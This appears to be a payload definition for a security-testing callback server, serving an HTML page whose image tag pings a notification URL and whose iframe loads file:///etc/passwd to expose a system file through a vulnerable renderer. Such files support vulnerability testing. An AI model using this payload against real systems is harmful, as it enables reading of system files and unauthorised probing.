---
title: HTML Iframe
description: HTML page with iframe and image callback
weight: 1
pattern: /ht$
is_final: true
data:
  headers:
    Content-Type: text/html
  body: |
    <html>
    <body>
      <img src="{{.NotifyString}}/static-lh" />
      <iframe src="file:///etc/passwd" height="500"></iframe>
    </body>
    </html>

---

### /ht

Iframe callback
